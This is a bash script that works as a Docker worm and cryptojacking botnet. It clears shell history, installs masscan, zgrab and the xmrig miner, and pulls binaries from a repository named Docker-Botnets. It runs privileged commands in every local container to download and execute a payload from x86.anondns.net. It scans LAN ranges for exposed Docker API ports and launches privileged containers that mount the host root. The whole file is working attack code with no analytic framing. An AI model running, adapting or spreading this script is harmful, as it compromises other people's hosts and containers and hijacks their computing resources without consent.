#!/bin/bash

unset HISTFILE
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games

RATE="50000"
SETUP_SLEEP="1"
TARGET="localhost" # Define TARGET appropriately
LAN_RANGES=("192.168.1.0/24" "10.0.0.0/8") # Example local ranges

# Main initialization function
function INIT_MAIN() {
    SETUP_BASICS
    SETUP_SYSTEM
    SETUP_TOOLS
    SETUP_MSCAN
    SETUP_XMR
    INFECT_ALL_CONTAINERS
    GETLOCALRANGES
    feed_the_ranges
}

# Install basic packages
function SETUP_BASICS() {
    apk update
    apk add --no-cache \
        go \
        git \
        sudo \
        jq \
        openrc \
        masscan \
        libpcap \
        libpcap-dev \
        docker \
        make \
        cmake \
        upx \
        libstdc++ \
        gcc \
        g++ \
        libuv-dev \
        iptables \
        openssl \
        openssl-dev \
        hwloc-dev \
        gmp-dev \
        gengetopt \
        flex \
        byacc \
        json-c-dev \
        libunistring-dev \
        judy-dev \
        bash \
        build-base \
        7zip \
        screen \
        curl \
        wget \
        vim 
}

# Update system and install additional packages
function SETUP_SYSTEM() {
    apk update || { echo "APK update failed"; exit 1; }
    apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev || { echo "Failed to install hwloc-dev"; exit 1; }
}

# Ensure tools are installed and set up
function SETUP_TOOLS() {
    mkdir -p /dev/shim/.../...nmlm...

    # Install curl if not present
    if ! command -v curl &>/dev/null; then
        apk update && apk add curl || { echo "Failed to install curl"; exit 1; }
    fi

    # Install wget if not present
    if ! command -v wget &>/dev/null; then
        apk update && apk add wget || { echo "Failed to install wget"; exit 1; }
    fi

    # Install bash if not present
    if ! command -v bash &>/dev/null; then
        apk update && apk add bash || { echo "Failed to install bash"; exit 1; }
    fi

    # Download and install zgrab and jq
    for file in zgrab jq; do
        if ! [ -f "/usr/sbin/$file" ]; then
            curl -sLk -o /usr/sbin/$file "https://github.com/Caprico1/Docker-Botnets/raw/014b5432a9403b896a3924b8704403e9ab284a68/TDGGinit/$file" || { echo "Failed to download $file"; exit 1; }
            chmod +x /usr/sbin/$file
        fi
    done
}

# Install masscan if not available
function SETUP_MSCAN() {
    apk update
    apk add git gcc make musl-dev libpcap-dev linux-headers masscan || { echo "Failed to install masscan"; exit 1; }
}

# Set up xmrig
function SETUP_XMR() {
    bash /root/setup_xmrig.sh || { echo "Failed to set up xmrig"; exit 1; }
}

# Infect all containers
function INFECT_ALL_CONTAINERS() {
    UPSPINTEST=http://x86.anondns.net/sbin
   # mkdir -p /host/bin
   # cp ./sbin /host/bin/sbin || { echo "Failed to copy sbin"; exit 1; }
    docker ps --quiet | while read -r container_id; do
        docker exec --privileged -d "$container_id" sh -c "apk update; apk add wget curl; mkdir -p /var/tmp/; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin" || { echo "Failed to infect container $container_id"; exit 1; }
    done
}

# Get local IP ranges
function GETLOCALRANGES() {
    ip route show | awk '{print $1}' | grep "/" > /tmp/.lr || { echo "Failed to get local ranges"; exit 1; }
}

# Scan and exploit Docker services
function dAPIpwn() {
    local range=$1
    local port=$2
    local rate=$3
    local rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6)

    ip_list=$(masscan --router-mac 66-55-44-33-22-11 "$range" -p"$port" --rate="$rate" | awk '{print $6}' | zgrab --senders 200 --port "$port" --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip) || { echo "Failed to scan range $range on port $port"; exit 1; }
    
    for ipaddy in $ip_list; do
        timeout -s SIGKILL 120 docker -H "$TARGET" run -d --net host --restart always --privileged --name nginx -v /:/host nmlmweb3/upspin || { echo "Failed to run Docker container on $ipaddy"; exit 1; }
    done
}

# Process local ranges and perform scans
function feed_the_ranges() {
    clear ; echo "Scanning local ranges" ; sleep 2 ; clear

    for LRANGE in "${LAN_RANGES[@]}"; do 
        dAPIpwn "$LRANGE" 2375 "$RATE"
        dAPIpwn "$LRANGE" 2376 "$RATE"
        dAPIpwn "$LRANGE" 2377 "$RATE"
        dAPIpwn "$LRANGE" 4243 "$RATE"
        dAPIpwn "$LRANGE" 4244 "$RATE"
    done 
}

INIT_MAIN
